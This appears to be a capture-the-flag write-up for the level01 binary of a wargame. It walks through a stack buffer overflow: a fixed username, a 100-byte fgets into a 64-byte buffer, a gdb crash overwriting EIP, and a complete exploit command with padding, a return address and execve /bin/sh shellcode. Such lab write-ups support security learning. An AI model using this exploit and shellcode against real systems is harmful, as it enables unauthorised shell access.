The first fgets is comparing our input with dat_wil and exit if its not the same. So we have no choice to enter dat_wil\n as first input to enter the else.
The else on the other way is doing a fgets with a size of 100 while s is allocated for 64 char only.
We can buffer over flow this, lets try with a lot a A:

Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 

We managed to overwrite eip with A, we now just have to put our shellcode instead:

python -c "print('dat_wil\n' + 'A' * 80 + '\x6c\xde\xff\xff')" > /tmp/test
level01@OverRide:~$ cat /tmp/test - | env -i SHELLCODE=$(python -c "print('\x90' * 500 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')") ./level01
